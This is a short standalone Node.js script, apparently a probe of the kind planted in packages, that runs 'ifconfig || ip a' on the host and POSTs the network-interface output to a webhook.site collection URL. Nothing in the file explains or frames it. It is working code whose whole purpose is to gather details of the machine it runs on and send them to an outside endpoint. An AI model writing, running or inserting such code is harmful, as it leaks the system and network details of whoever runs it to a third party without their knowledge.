const https = require('https');
const { exec } = require('child_process');

exec('ifconfig || ip a', (err, stdout) => {
  const payload = JSON.stringify({ output: stdout || err?.message });
  const req = https.request('https://webhook.site/6b9c18ef-18ff-465a-a7c6-f788fd9ed20b', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
});
